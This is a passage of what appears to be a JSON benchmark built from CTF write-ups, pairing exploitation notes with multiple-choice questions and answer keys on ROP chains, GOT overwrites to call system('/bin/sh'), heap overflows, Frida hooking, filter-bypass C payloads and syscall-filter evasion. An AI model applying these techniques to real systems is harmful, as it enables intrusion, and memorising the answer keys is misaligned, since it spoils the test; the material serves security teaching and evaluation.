            "https://ctftime.org/event/2000/tasks/"
        ],
        "score": 490,
        "max_score": 500,
        "difficulty": 0.98,
        "knowledge": [
            "When dealing with challenges involving AES CBC encrypted files, it's crucial to look for patterns or repeating sequences within the encrypted files that could signify embedded information such as the encryption key, IV (Initialization Vector), or hints towards them. This is especially true if the challenge hints at \"strange\" aspects in the byte patterns of the files. For instance, identifying a consistent pattern across multiple files can lead to the discovery of embedded keys or IVs necessary for decryption.",
            "In scenarios where you've identified a potential embedded encryption key and IV within the encrypted files, and you know the encryption algorithm (AES CBC in this case), you can extract these elements and attempt decryption. This requires removing the identified pattern from the files and using the remaining bytes as input for the decryption process. The successful decryption of the files might lead to the recovery of the original data or the extraction of a flag if it's a CTF challenge. A Python script utilizing libraries like PyCryptoDome can be employed for this decryption process, where the identified bytes are used as key and IV.\n   \n   Example script structure (specific payload or script details not provided due to the context):\n   ```python\n   from Crypto.Cipher import AES\n   from Crypto.Util.Padding import unpad\n\n   # Assuming key and iv are the extracted bytes as identified from the repeating pattern\n   key = b'replaced_with_extracted_key'\n   iv = b'replaced_with_extracted_iv'\n\n   def decrypt_aes_cbc(encrypted_message):\n       cipher = AES.new(key, AES.MODE_CBC, iv)\n       decrypted_message = unpad(cipher.decrypt(encrypted_message), AES.block_size)\n       return decrypted_message\n\n   # Example usage\n   # encrypted_message = b'replaced_with_encrypted_data'\n   # print(decrypt_aes_cbc(encrypted_message))\n   ```"
        ],
        "question": [
            "In a Capture The Flag challenge focusing on AES CBC encryption, participants discovered an odd repeating byte pattern across multiple encrypted files. If the pattern comprises of specific characters followed by unknown bytes, which of the following is the most logical step to decrypt the files? - A. Copy the byte pattern directly into the decryption script as plaintext. - B. Ignore the pattern as it is likely a distraction and not related to the encryption scheme. - C. Attempt to crack the encryption algorithm instead of focusing on the byte pattern. - D. Analyze the pattern to identify if it includes the encryption key and IV, then use them to decrypt the files.",
            "In the given scenario where a repeating byte pattern in encrypted files potentially holds the key and IV for AES CBC encryption, and considering you plan to decrypt the data with a Python script, which part of the decryption process is crucial to correctly implement? - A. Using the entire byte pattern as a single block for both key and IV without separation. - B. Identifying and separating the first 32 bytes for the key and the next segment for the IV, then using these for decryption. - C. Ignoring any identified patterns and randomly generating a new key and IV for decryption. - D. Encrypting the byte pattern again with a different algorithm before attempting decryption."
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "string",
        "write_up": "dataset/raw/string.equals(integer).md",
        "type": "misc",
        "competition": [
            "ByteBandits/2020",
            "https://ctftime.org/event/1022/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When facing hash function reverse engineering in CTF challenges, pre-calculating and storing the results of expensive computations can significantly optimize the brute-force process. In scenarios where the hash functions involve operations that are repeated across inputs, such as `pow(31, i, mod)` which doesn't change between hash calculations, pre-calculation and memorization can be utilized to speed up the hashing process. This approach is especially useful when the range of input parameters (e.g., the range of `i`) is known and limited.",
            "For challenges involving the identification or reverse-engineering of data based on its hash values, employing hash tables (dictionaries in Python) to map hash values to their corresponding original data strings allows for efficient lookup and reconstruction of the original dataset. This technique is particularly effective when dealing with a finite and reasonable number of possible data extracts or permutations, as pre-computing all hash values and then matching them against a provided list of hashes enables the quick retrieval of original data without the need for re-computation.\n\nExample of optimizing hash function using pre-calculation:\n```python\n# Pre-calculate powers of 31 mod mod and mod2\npows1 = [pow(31, i, mod) for i in range(105)]\npows2 = [pow(31, i, mod2) for i in range(105)]\n\ndef optimized_func1(s):\n    h = 0\n    for i in range(len(s)):\n        h += (ord(s[i]) - 96) * pows1[i]\n        h %= mod\n    return h\n\ndef optimized_func2(s):\n    h = 0\n    for i in range(len(s)):\n        h += (ord(s[i]) - 96) * pows2[i]\n        h %= mod2\n    return h\n```\n\nExample of reconstructing original data from hash values:\n```python\nmemorized_hashes = {hash_value: original_data for hash_value, original_data in precomputed_pairs}\nexpected_hashes = open(\"hashes.txt\", 'r').readlines()\noriginal_data_string = \"\"\nfor hash_value in expected_hashes:\n    original_data_string += memorized_hashes[hash_value.strip()]\n```"
        ],
        "question": [
            "In a CTF challenge related to optimizing hash computations, why might pre-calculating powers of 31 and using them directly in the hash function be beneficial? - A. It decreases the memory usage by avoiding the storage of intermediate computations. - B. It allows the hash function to operate on larger strings than originally possible. - C. It speeds up the computation by avoiding repetitive calculation of `pow(31, i, mod)` for each character in the string. - D. It enhances the security of the hash function by using pre-computed values. ",
            "When attempting to reverse-engineer hashed data in a CTF challenge, which approach allows for efficient lookup and reconstruction of the original dataset? - A. Creating a list that sequentially stores every possible hash computation result. - B. Using a first-in-first-out (FIFO) queue to match hash values with their corresponding original data. - C. Mapping each hash value to its corresponding original data string in a hash table, enabling quick retrieval based on hash values. - D. Encrypting the hash values alongside their original data for added security during the match-up process. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Strong padlock",
        "write_up": "dataset/raw/Strong padlock.md",
        "type": "This is a **reverse** challenge.",
        "competition": [
            "RaziCTF/2020",
            "https://ctftime.org/event/1167/tasks/"
        ],
        "score": -1,
        "max_score": 996,
        "difficulty": -1,
        "knowledge": [
            "When needing to bypass repetitive tasks within an Android application, such as clicking a button numerous times, utilizing Frida to hook into the application's methods can automate or directly manipulate the application's behavior to achieve the desired result. This can be especially useful when direct interaction with the application is impractical due to the sheer volume of required interactions.\n   - Example payload:\n     ```javascript\n     const switcher = Java.use(\"com.example.razictf.switcher\").$new();\n     console.log(switcher.run(18)+switcher.run(15)+switcher.run(12)+switcher.run(10)+switcher.run(5));\n     ```",
            "Decompile Android applications using tools like JADX to analyze the application's code. This can help in understanding the application's logic, identifying crucial functions, and crafting Frida scripts to interact with these functions directly. This approach is particularly useful for extracting specific parts of data, such as flag parts in CTF challenges, without following the intended use of the application.\n   - No specific payload provided, as the knowledge extracted is about the process of analyzing and crafting scripts based on the application's decompiled code."
        ],
        "question": [
            "In an Android CTF challenge, to bypass an application's requirement of performing an action (like clicking) 20,000 times, which of the following Frida scripts correctly demonstrates how to directly invoke a method within the application that changes the count of required actions? - A. `Java.cast(\"com.example.razictf.counter\").run(0);` - B. `Java.use(\"com.example.razictf.switcher\").run(20);` - C. `const switcher = Java.use(\"com.example.razictf.switcher\").$new(); console.log(switcher.run(18)+switcher.run(15)+switcher.run(12)+switcher.run(10)+switcher.run(5));` - D. `switcher.instance().run(20000);`",
            "In the context of a CTF challenge involving an Android app, after decompiling the app using JADX and identifying the main activity, which step is essential for crafting a Frida script to extract parts of a flag without artificially performing the intended app interaction? - A. Creating a new Android activity to intercept the data. - B. Manually performing the task the app requires to understand its logic. - C. Identifying crucial functions within the decompiled code and using Frida to invoke these functions directly. - D. Rewriting the application's code to remove security checks."
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "strong-arm",
        "write_up": "dataset/raw/strong-arm.md",
        "type": "crypto",
        "competition": [
            "WPICTF/2021",
            "https://ctftime.org/event/1208/tasks/"
        ],
        "score": 300,
        "max_score": 500,
        "difficulty": 0.6,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities in ARM64 architecture, it's essential to understand how the ARM64 calling convention works, especially that `x30` holds the return address and not the stack. This knowledge is crucial to forge Return Oriented Programming (ROP) chains accurately. An example strategy involves using gadgets to manipulate `x19` and `x20` registers to eventually control `x0` for system call arguments.",
            "In scenarios involving return-to-libc (ret2libc) attacks where the binary has a Global Offset Table (GOT) that is not write-protected, one can overwrite GOT entries to hijack the control flow of the program. Specifically, you can overwrite function pointers in the GOT with addresses of desired libc functions (like `system`) and control arguments through subsequent program input. This technique is effective for bypassing non-executable stack protections and securing a shell. Example payload steps would include crafting a payload to: \n   - overflow the buffer to reach the GOT,\n   - overwrite a GOT entry (e.g., `puts`) with the address of a critical libc function (e.g., `system`),\n   - ensure subsequent function calls use the overwritten GOT entry to execute chosen functions (like having subsequent `puts` calls actually call `system(\"/bin/sh\")`)."
        ],
        "question": [
            "In ARM64 architecture ROP exploitation, consider a scenario where a buffer overflow allows overwriting the return address. Given this setup and aiming to use ROP for control flow hijack, which register should be manipulated to directly influence the return address of a function? - A. Modify the `x0` register to point to the next gadget. - B. Modify the `sp` (stack pointer) register to redirect execution flow. - C. Modify the `x30` register which holds the return address. - D. Modify the `x29` register to change the base pointer for stack frame realignment. ",
            "In an exploitation scenario involving a return-to-libc attack on a binary with a vulnerable buffer overflow and non-write-protected Global Offset Table (GOT), which of the following steps is a viable strategy to hijack the control flow and gain arbitrary code execution? - A. Overflow the buffer to reach the stack canary and overwrite it with a custom value. - B. Overflow the buffer to reach the GOT, and overwrite a GOT entry (e.g., `puts`) with the address of a benign function like `printf`. - C. Perform a heap spray to ensure that the overwritten GOT entry points to a controlled area in memory containing ROP gadgets. - D. Overflow the buffer to reach the GOT, and overwrite a GOT entry (e.g., `puts`) with the address of a critical libc function (e.g., `system`), then ensure subsequent function calls use the overwritten GOT entry to execute chosen functions. "
        ],
        "answer": [
            "C. Modify the `x30` register which holds the return address.",
            "D. Overflow the buffer to reach the GOT, and overwrite a GOT entry (e.g., `puts`) with the address of a critical libc function (e.g., `system`), then ensure subsequent function calls use the overwritten GOT entry to execute chosen functions."
        ]
    },
    {
        "name": "StrVec",
        "write_up": "dataset/raw/StrVec.md",
        "type": "pwn",
        "competition": [
            "ASIS/2021/Quals",
            "https://ctftime.org/event/1415/tasks/"
        ],
        "score": 114,
        "max_score": 500,
        "difficulty": 0.228,
        "knowledge": [
            "In challenges involving heap exploitation, if the programming logic uses manual arithmetic for buffer sizes instead of secure functions like `calloc`, there is a risk of integer overflow leading to incorrect memory allocation sizes. This can be exploited to perform out of bounds read or write operations. When creating or manipulating heap-based data structures, always check for possible integer overflows that can lead to erroneous memory allocations. For example, by crafting inputs that cause the size calculations to overflow, an attacker can manipulate the program's memory in unintended ways.",
            "For leaking libc addresses through manipulation of the heap, strategically crafted heap chunks can be utilized. Specifically, by creating a fake heap chunk with carefully set headers and placing it in such a way that it gets moved to the unsorted bin, one can leak libc addresses stored in the forward and backward pointers of the chunk. The technique requires understanding of glibc's memory allocation mechanisms, especially how chunks are moved between different bins (t-caches, fast bins, unsorted bins) upon allocation and free operations. In practice, this method can be applied by first filling up the t-cache for a particular chunk size to ensure the next freed chunk of that size moves to the unsorted bin, followed by crafting and freeing a fake chunk with a size that isn't cached by t-caches to leak the libc address from its fd/bk pointers."
        ],
        "question": [
            "In a heap exploitation challenge, the vulnerability arises from manual size calculation for a buffer without securing against integer overflows, as shown in this pseudo code: ```c vector *vector_new(int nmemb) { if (nmemb <= 0) return NULL;  int size = sizeof(vector) + sizeof(void*) * nmemb; vector *vec = (vector*)malloc(size); if (!vec) return NULL;  memset(vec, 0, size); vec->size = nmemb;  return vec; } ``` What is the risk associated with this implementation? - A. Use of `malloc` instead of `calloc` can cause memory leakage. - B. Memory allocations with `malloc` are not zero-initialized, leading to potential information disclosure. - C. An integer overflow can occur during size calculation, leading to incorrect allocation size and potential out-of-bounds access. - D. Use of `memset` with `size` can unintentionally clear memory not belonging to the allocated `vec`. ",
            "In an attempt to leak libc addresses using heap exploitation techniques, an attacker can employ a strategy to manipulate the heap and insert a fake chunk into the unsorted bin to leak addresses. The attacker follows this process outlined in the pseudo-code: ```python # Create a fake chunk (header setup) fake_chunk = p64(0x0) + p64(0x811) + p64(0) + p64(0) # Setup for leak set(1, fake_chunk[:30])  # Store chunk # Manipulate heap based on offsets and sizes set(offset, p64(heap_base + calc_offset) + b'payload') # Triggering condition to get the chunk in unsorted bin for leak set(get_idx(calculated_offset), p64(heap_base + another_calc_offset) + b'another payload') ``` What is crucial for this technique to successfully leak a libc address? - A. Precise control over the `malloc` and `free` order to avoid heap fragmentation. - B. Insertion of a fake chunk into the unsorted bin with carefully set headers, leveraging knowledge of glibc's bin management. - C. Strict alignment of heap chunks to guarantee predictable allocation patterns. - D. Ensuring that all heap allocations are done using `calloc` to prevent uninitialized reads. "
        ],
        "answer": [
            "C. An integer overflow can occur during size calculation, leading to incorrect allocation size and potential out-of-bounds access.",
            "B. Insertion of a fake chunk into the unsorted bin with carefully set headers, leveraging knowledge of glibc's bin management."
        ]
    },
    {
        "name": "Suffarring",
        "write_up": "dataset/raw/Suffarring.md",
        "type": "The type of this CTF challenge is **pwn**.",
        "competition": [
            "PlaidCTF/2019",
            "https://ctftime.org/event/743/tasks/"
        ],
        "score": 500,
        "max_score": 666,
        "difficulty": 0.7507507507507507,
        "knowledge": [
            "In a binary exploitation challenge, specifically when dealing with heap-based vulnerabilities, if the input length (needle) can be controlled and made longer than the buffer (haystack), a heap overflow can be induced. This scenario requires a program that does not correctly check or mistakenly trusts user input lengths, leading to potential arbitrary code execution or information disclosure. Example payload structure for heap overflow (simplified for conceptual understanding):\n    ```\n    payload = \"<controlled data to overflow buffer>\" + \"<new heap header>\" + \"<controlled next chunk size or data>\"\n    ```",
            "After triggering a heap overflow, it can be exploited to modify adjacent heap chunks' metadata. This includes changing the size and metadata pointers of following chunks, which can lead to a condition where arbitrary memory read/write operations become possible. This technique is particularly powerful in environments using tcache (thread caching) malloc implementations, where exploiting the overflow can lead to hijacking of the execution flow or data leakage, such as leaking LIBC addresses. This knowledge applies universally across programs that use similar memory allocation strategies, and it exploits the lack of safeguard checks around heap chunk sizes and pointers.\n   \n    There's no specific payload structure provided for this exploitation technique since it varies greatly depending on the target program's memory layout and the actual heap management implementation (e.g., glibc, tcache). The concept, however, remains that manipulating the metadata of heap chunks adjacent to an overflowed chunk allows for advanced exploitation scenarios."
        ],
        "question": [
            "In a binary challenge focusing on heap-based vulnerabilities, considering a scenario where an attacker is able to make the input (needle) longer than the buffer (haystack) leading to heap overflow. What structure does the example payload for inducing heap overflow typically include? - A. Just enough controlled data to fill the buffer without overflowing. - B. Controlled data to overflow the buffer, an additional heap header, and controlled next chunk size or data. - C. An exact match of the buffer size followed by arbitrary data to crash the program. - D. Random data without any structure or consideration for heap headers or chunk sizes.",
            "In the context of exploiting heap overflow vulnerabilities, particularly in a binary using tcachemalloc implementation for memory allocation, one manipulation following the overflow is to modify metadata of adjacent heap chunks. What does this allow an attacker to do? - A. Simply crash the program without any further exploitation potential. - B. Cause a minor slowdown in the program's execution speed. - C. Achieve arbitrary memory read/write operations by changing the size and metadata pointers of following chunks. - D. Encrypt heap data to prevent other attackers from exploiting the same vulnerability."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Super Secure Vault",
        "write_up": "dataset/raw/Super Secure Vault.md",
        "type": "crypto",
        "competition": [
            "Pragyan/2019",
            "https://ctftime.org/event/755/tasks/"
        ],
        "score": 400,
        "max_score": 400,
        "difficulty": 1.0,
        "knowledge": [
            "When faced with an algorithm that requires you to find a specific input based on modular conditions, and if these moduli are co-prime, applying the Chinese Remainder Theorem (CRT) provides a systematic way to solve for the input. This method is particularly useful in scenarios where the solution to a system of modular linear equations is needed, and it ensures that a unique solution exists modulo the product of the moduli. The Chinese Remainder Theorem can be implemented programmatically to automate the solution process.\n   \n   - For instance, given the modular conditions:\n     ```\n     s = 213 mod 27644437\n     s = 229 mod 10459\n     s = 25 mod 1489\n     s = 83 mod 1046527\n     s = 135 mod 16127\n     ```\n     One can use CRT to find a unique solution for `s`.",
            "In scenarios involving encryption or hashing challenges that utilize a known \"matrix\" or table of values to transform input data based on specific rules (such as concatenating certain strings or modifying input in other systematic ways), deciphering the output can be achieved by reverse-engineering the process. This requires understanding the transformation logic applied to the input and carefully crafting an algorithm that can calculate the indices or positions within the matrix or table based on the manipulated input, thus revealing the original input or password.\n   \n   - To decipher the output, an example algorithm could look like:\n     ```python\n     v12 = str(s) + str(N) + \"80\"  # Concatenate strings and additional characters as per challenge logic.\n     v12 = list(map(int, list(v12)))  # Convert the string into individual integers for processing.\n\n     password = b\"\"\n     # Logic to calculate indices based on transformed input and retrieve corresponding values from matrix.\n     while condition:\n         index = some_calculation(v12)  # Calculate index based on challenge logic.\n         password += bytes([matrix[index]])  # Append the byte from the matrix at the calculated index to the password.\n     print(password)\n     ```\n     This example logic is particularly relevant when the transformation process involves complex manipulations like concatenation of a large number with another string followed by specific operations as mentioned in the challenge."
        ],
        "question": [
            "When utilizing the Chinese Remainder Theorem (CRT) to solve for an input based on modular conditions with co-prime moduli, consider the following system: - s = 213 mod 27644437 - s = 229 mod 10459 - s = 25 mod 1489 - s = 83 mod 1046527 - s = 135 mod 16127 Given these conditions, which of the following is a necessary feature of the moduli for CRT to guarantee a unique solution? - A. Each modulus must be greater than the solution `s` - B. The moduli must all be even numbers - C. The moduli must be co-prime - D. Each modulus must be a perfect square ",
            "In a challenge where an input string is processed by concatenating it with a large number, appending \"80\", and then transforming each character of the input based on their positions within a certain matrix, how should one approach reverse-engineering the original input or password from the encoded output? - A. By computing the hash of the concatenated string and comparing it to known hashes - B. By iterating over each character of the encoded output to find corresponding indices in the matrix - C. By performing a brute-force search of all possible inputs until the encoded output matches a given result - D. By reversing the concatenation and transformation logic to calculate indices in the matrix that were used to encode the input "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "SuperCurve",
        "write_up": "dataset/raw/SuperCurve.md",
        "type": "crypto",
        "competition": [
            "CSAW/2019/Quals",
            "https://ctftime.org/event/870/tasks/"
        ],
        "score": 300,
        "max_score": 500,
        "difficulty": 0.6,
        "knowledge": [
            "When solving Elliptic Curve Discrete Logarithm Problems (ECDLP) with a small prime number `p` as the field size, brute force or algorithmic methods like using SageMath's `discrete_log` function can effectively find the solution. Condition: This approach is effective if the field size `p` is sufficiently small to allow practical computation times. Example command snippet using SageMath for ECDLP:  \n```python\na, b = 1, -1  # Curve parameters\np = 14753  # Small prime number field size\nE = EllipticCurve(Zmod(p), [a, b])  # Define the elliptic curve\nG = E(1, 1)  # Base point\nP = E(Px, Py)  # Public key point\nd = discrete_log(P, G, operation=\"+\")  # Solve for the discrete logarithm\n```",
            "For ensuring the security of elliptic curve cryptography, it is critical to use secure parameters. The challenge highlights this by naming the flag `use_good_params`, suggesting the vulnerability was due to poor parameter choice. Condition: This advice is paramount when designing or auditing cryptographic systems based on elliptic curves. The use of weak parameters can lead to the compromise of the cryptographic primitives and, consequently, the security of the system."
        ],
        "question": [
            "When given a small prime number field size for resolving ECDLP problems, which method or function is adequately suited for finding the discrete logarithm according to the snippet provided? - A. `discrete_log(P, G, operation=\"+\")` using SageMath for practical computation time. - B. `logarithmic_solve(P, G)` without specifying the operation, assuming general mathematical principles apply. - C. `find_logarithm(P, G)` by manually implementing a search algorithm in Python. - D. `calculate_discrete_log(P, G)` without leveraging specialized libraries or frameworks.",
            "In the context of elliptical curve cryptography (ECC), which of the following is a pivotal aspect to ensure the security of cryptographic systems based on elliptic curve parameters? - A. Using randomized curve generation algorithms without validation. - B. Selecting secure, well-audited parameters to prevent vulnerabilities due to poor parameter choice. - C. Prioritizing performance over security by choosing faster, less secure parameters. - D. Ignoring the curve parameters' origin as long as the implementation is efficient."
        ],
        "answer": [
            "A",
            "B"
        ]
    },
    {
        "name": "Susan Landau",
        "write_up": "dataset/raw/Susan Landau.md",
        "type": "web",
        "competition": [
            "CyberHeroines/2023",
            "https://ctftime.org/event/2054/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
            "When facing a web challenge that involves CSRF tokens as part of its security mechanism, closely inspect the site\u2019s cookies for any unusual or interesting tokens that stand apart from common ones like PHPSESSID. This inspection could reveal opportunities to exploit the security by altering these tokens. A practical step involves checking if these tokens, particularly csrf_token, can be decrypted or manipulated to bypass security checks.",
            "If a challenge provides hints towards using specific names or terms and involves encryption or hashing, consider converting these hints into their hashed (e.g., MD5) equivalents before using them. This approach is especially relevant when the hint or clue seems related to authentication mechanisms or where specific tokens or keywords are expected in a certain encrypted form. For instance, converting 'cyberheroine' into its MD5 hash (*09a206b401aaa7b5315e1d814ce16896*) and using this as a token or password to access restricted areas."
        ],
        "question": [
            "When investigating a web application for CSRF vulnerabilities and you come across a csrf_token in the site's cookies, which of the following would be your next step to potentially bypass security mechanisms? - A. Attempt to delete the csrf_token and bypass the security check. - B. Use the csrf_token as is for further requests without any manipulation. - C. Decrypt or manipulate the csrf_token if possible, to see if it can be used to gain unauthorized access. - D. Ignore the csrf_token, focusing instead on other cookies like PHPSESSID for vulnerabilities. ",
            "In a scenario where a web challenge suggests using specific names or terms, and it is related to accessing restricted areas, what should be considered regarding these hints or names before using them? - A. Convert these names or terms directly into URL encoded format and use them as parameters. - B. Use these names or terms as plain text in HTTP headers to bypass security checks. - C. Ignore these hints as they are likely to be red herrings and not useful for solving the challenge. - D. Convert these names or terms into their hashed equivalents (e.g., MD5) before using them, especially if the challenge hints at encryption or hashing requirements. "
        ],
        "answer": [
            "C. Decrypt or manipulate the csrf_token if possible, to see if it can be used to gain unauthorized access.",
            "D. Convert these names or terms into their hashed equivalents (e.g., MD5) before using them, especially if the challenge hints at encryption or hashing requirements."
        ]
    },
    {
        "name": "Sushi",
        "write_up": "dataset/raw/Sushi.md",
        "type": "misc",
        "competition": [
            "WPICTF/2019",
            "https://ctftime.org/event/728/tasks/"
        ],
        "score": 300,
        "max_score": 500,
        "difficulty": 0.6,
        "knowledge": [
            "When faced with a custom encoding challenge where the encoded message uses a delineated structure with unique letter patterns, closely examine any provided hints or images for a matching pattern or grid. This approach is particularly effective if the encoding uses a subset of characters (like 'A' to 'Y') and includes peculiarities like case insensitivity or delimiter usage to separate encoding units. This understanding can then be applied to reverse engineer the encoding mechanism. \n   - Condition: Applicable to challenges leveraging custom encodings with visual or text-based hints.\n   - Knowledge: Identifying a corresponding pattern or grid in hints can reveal the encoding strategy, especially if the encoding operates over a constrained alphabet and uses delimiters to segment data.",
            "In encoding schemes where letters within a unit are duplicated an arbitrary number of times and the presence of a character in a decoded message depends on the parity of its occurrences (odd or even), apply logical operations like XOR to convert the set of letters in an encoded unit back to meaningful data. This technique is useful in converting seemingly random character sets into a decipherable format, leveraging the insight that the final state of a letter (active or inactive) can be determined by its frequency of occurrence.\n   - Condition: Suitable for challenges where encoded data is represented by repeating characters whose significance is dictated by their number of appearances within each unit of the encoding.\n   - Knowledge: Utilizing XOR logic on character occurrences can decode messages in custom encoding schemes where the repetition of characters indicates their presence or absence in the final decoded message."
        ],
        "question": [
            "In a custom encoding challenge, you notice that encoded text is divided into segments with each segment containing a series of letters ('A' to 'Y') and separated by a specific delimiter ('z'). Additionally, an anomaly has caught your attention: the case of the letters seems irrelevant to the encoding process. Given a hint comprised of a grid containing letters from 'A' to 'Y', which approach should you consider to potentially decode or make sense of the encoded message? - A. Count the occurrence of each letter regardless of case sensitivity to determine their significance. - B. Match the encoded segments to the position of letters in the grid provided by the hint, ignoring case sensitivity. - C. Focus only on the sequence of capital letters as they represent the actual encoding key. - D. Replace all delimiter characters with a space to read the encoded message directly.",
            "When dealing with an encoding method where each character within a unit may appear multiple times and its final inclusion in the decoded message depends on whether it appears an odd or even number of times, which operation is most effective for interpreting the sequences of characters into a logical format that could reflect the original message? - A. Calculate the sum of the ASCII values of all characters in a unit and compare it to a known conversion table. - B. Apply XOR to each character occurrence within a unit to determine its presence or absence in the trace of the unit. - C. Perform a modulo operation on the count of each character to determine its relevance to the encoded data. - D. Concatenate all unique characters in a unit, disregarding their frequency of appearance."
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "SW Expert Academy",
        "write_up": "dataset/raw/SW Expert Academy.md",
        "type": "web",
        "competition": [
            "HackersPlayground/2021",
            "https://ctftime.org/event/1396/tasks/"
        ],
        "score": 121,
        "max_score": 187,
        "difficulty": 0.6470588235294118,
        "knowledge": [
            "When dealing with challenges involving server-side code execution with source code filters, one can bypass restrictions on certain keywords (like function names or symbols) through the use of C macros combined with digraphs. This technique allows the concatenation of filtered keywords at compile time, bypassing the filter without directly writing the prohibited terms in the source code. Instead of using the `#` symbol for macros, digraphs can be utilized (e.g., `%:` instead of `#` for defining macros).  \n**Example payload**:  \n   ```C\n   %:define OPEN(path, mode) fop%:%:en(path, mode)\n   %:define SCAN(f, fmt, buf) fsca%:%:nf(f, fmt, buf)\n   ```",
            "In scenarios where direct access to files or execution of certain functions is restricted by filters in code-injection challenges, triggering execution errors intentionally can be leveraged to leak file contents or other sensitive information. By exploiting the server's behavior of revealing error messages, one can force the program to exit with an error after attempting to perform a restricted action or accessing a prohibited file, which causes the server to return the error details. This method relies on creative ways to include the blocked operations or filenames indirectly to trigger meaningful errors revealing useful information.  \n**Example concept**: Attempting to read a file and then intentionally causing an error to leak the file's contents through error messages, without directly using prohibited function names or keywords in the payload."
        ],
        "question": [
            "In a challenge involving server-side code execution filtering, how can one bypass restrictions on using certain keywords like fopen or include, without directly writing the prohibited terms in the source code? - A. Use regular expressions to mask the true intentions of the code. - B. Encrypt the function names and decrypt them at runtime. - C. Utilize C macros combined with digraphs to concatenate filtered keywords at compile time. - D. Comment out the filtered keywords to deceive the source code filter. ",
            "When direct access to files is prohibited by source code filters in a code-injection challenge, which technique can be utilized to leak sensitive information through error messages? - A. Encrypting the contents of the file and decrypting them in the error message. - B. Initiating a buffer overflow to cause the server to return the contents of the file in the error message. - C. Using a proxy server to intercept and modify the error messages sent by the server. - D. Triggering execution errors intentionally after trying to perform a restricted action to leak file contents or sensitive information through the server's error messages. "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Symatrix",
        "write_up": "dataset/raw/Symatrix.md",
        "type": "The type of this CTF challenge is **forensics**.",
        "competition": [
            "GoogleCTF/2023",
            "https://ctftime.org/event/1929/tasks/"
        ],
        "score": 114,
        "max_score": 320,
        "difficulty": 0.35625,
        "knowledge": [
            "When faced with an encoded message hidden within the pixels of a PNG image using a proprietary steganography algorithm, analysis of the algorithm's embedded data manipulation technique is crucial. If the algorithm embeds data by modifying the least significant bits of pixel values, look for patterns in pixel modifications, such as consistent changes in the blue channel or markers in another channel (e.g., green) indicating modified pixels. This understanding can guide the development of a decoding script that inversely applies the algorithm to extract the hidden data.",
            "In steganography challenges where the encoder adds a bit to a specific color channel of a pixel (e.g., the blue channel) and uses another channel (e.g., the green channel) to flag pixels carrying hidden bits, a decoding approach can reverse this by iterating over pixels to reconstruct the binary string of hidden data. The extracted bits can then be converted from binary to hexadecimal, and finally to ASCII to reveal the hidden message. This method requires careful attention to the initial encoding logic, specifically how bits are represented and spaced within the image's pixel data structure.\n   \n   Example payload snippet for decoding based on the observed encoding pattern:\n```py\nbinary_result_string = ''\nfor pixel in modified_pixels:\n    if pixel_indicates_data(pixel):\n        binary_result_string += extract_bit_from_pixel(pixel)\nhidden_data = binary_to_ascii(binary_result_string)\n```"
        ],
        "question": [
            "When attempting to reverse-engineer a proprietary steganography algorithm used to hide messages within the pixels of a PNG image, which characteristic of the pixel modifications would be most helpful to guide the development of a decoding script?  - A. Changes made to the metadata of the PNG file to include encrypted hashes of the hidden message. - B. Consistent changes in a specific color channel of the pixels, such as the blue channel, or markers in another channel indicating modified pixels. - C. Random alterations in the image resolution to disguise the presence of a hidden message. - D. Variations in the file size of the PNG image that correspond to the length of the encoded message. ",
            "In a steganography challenge where the encoder script embeds data into a specific color channel of pixels and uses another color channel to flag pixels carrying hidden bits, which step is critical for decoding and extracting the hidden message?  - A. Iterating over each pixel in the image and modifying the alpha channel to reconstruct the binary string of hidden data. - B. Applying a color filter to the entire image to enhance the visibility of encoded pixels before extracting the binary data. - C. Iterating over pixels to reconstruct the binary string of hidden data based on specific alterations in the color channels, then converting this binary data to hexadecimal, and finally to ASCII. - D. Converting the RGB values of each pixel directly into ASCII characters without analyzing specific channel modifications. "
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "syscall kit",
        "write_up": "dataset/raw/syscall kit.md",
        "type": "pwn",
        "competition": [
            "zer0pts/2020",
            "https://ctftime.org/event/1006/tasks/"
        ],
        "score": 671,
        "max_score": 755,
        "difficulty": 0.8887417218543047,
        "knowledge": [
            "When a binary with Position Independent Executable (PIE) protection prohibits direct address leaks and places restrictions on syscall usage, the `brk` syscall can be utilized to extend the heap and effectively serve as a consistent reference point. This approach enables the construction of a reliable exploit by manipulating the heap to leak addresses or modify memory, even without initially knowing the binary's base address. Example steps to achieve this include using `brk(0x10000)` to allocate heap space and then leveraging that space as a scratchpad for further operations.",
            "In environments where direct syscall execution is restricted or monitored, it's possible to bypass syscall filters by utilizing alternative syscalls that are not blacklisted and can indirectly achieve the desired effect. For instance, the `arch_prctl` syscall can be repurposed to write values to arbitrary addresses by manipulating the GS register, and syscalls like `writev` and `readv` can be used for arbitrary read/write primitives. This technique involves carefully planning a chain of benign-looking syscalls to manipulate memory and execute arbitrary code, demonstrating a method to circumvent syscall filtering mechanisms. An example sequence includes setting the GS register to a controlled value using `arch_prctl(ARCH_SET_GS, value)` and then using `writev` or `readv` with crafted structures to read or write memory."
        ],
        "question": [
            "In a scenario where a binary's protection measures prevent direct leak of its base address, which syscall can be strategically used to extend the heap, thus creating a consistent reference point for constructing a reliable exploit?  - A. `execve('/bin/sh', NULL, NULL)` - B. `fork()` - C. `brk(0x10000)` - D. `open('/etc/passwd', O_RDONLY)` ",
            "When direct syscall execution is restricted in a binary, which alternative approach can be used to manipulate specific registers and thus indirectly modify arbitrary memory locations, showcasing a technique to bypass syscall filtering mechanisms?  - A. Utilizing the `exit` syscall to terminate the process with a specific status code. - B. Using the `arch_prctl` syscall with the `ARCH_SET_GS` command to write values to the GS register. - C. Employing the `chmod('/etc/password', 0777)` syscall to change permissions of system files. - D. Calling the `getuid()` syscall to retrieve the user ID of the calling process. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "system-leak",
        "write_up": "dataset/raw/system-leak.md",
        "type": "pwn",
        "competition": [
            "Defcamp/2023/Quals",
            "https://ctftime.org/event/2106/tasks/"
